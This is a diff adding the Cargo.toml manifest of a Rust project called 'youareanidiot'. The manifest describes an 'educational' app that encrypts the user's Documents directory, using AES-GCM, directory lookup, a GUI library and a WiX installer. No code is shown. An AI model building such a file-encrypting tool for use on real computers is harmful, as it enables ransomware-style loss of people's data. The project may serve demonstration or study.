@@ -1,0 +1,28 @@
+[package]
+name = "youareanidiot"
+version = "0.1.0"
+edition = "2024"
+repository="https://github.com/nbittich/youareanidiot"
+authors=["Your Mom"]
+description="Educational app that encrypt the my documents directory"
+
+[package.metadata.wix]
+upgrade-guid = "477DB7F7-673D-48C7-83B0-8AE530DBB19D"
+path-guid = "38C6AF6B-F505-464D-98D2-4D714126B911"
+license = false
+eula = false
+
+[dependencies]
+aes-gcm = "0.10.3"
+dirs = "6.0.0"
+rand = "0.9.0"
+serde = { version = "1.0.218", features = ["serde_derive"] }
+slint = "1.9.2"
+
+[build-dependencies]
+slint-build = "1.9.2"
+
+# The profile that 'dist' will build with
+[profile.dist]
+inherits = "release"
+lto = "thin"
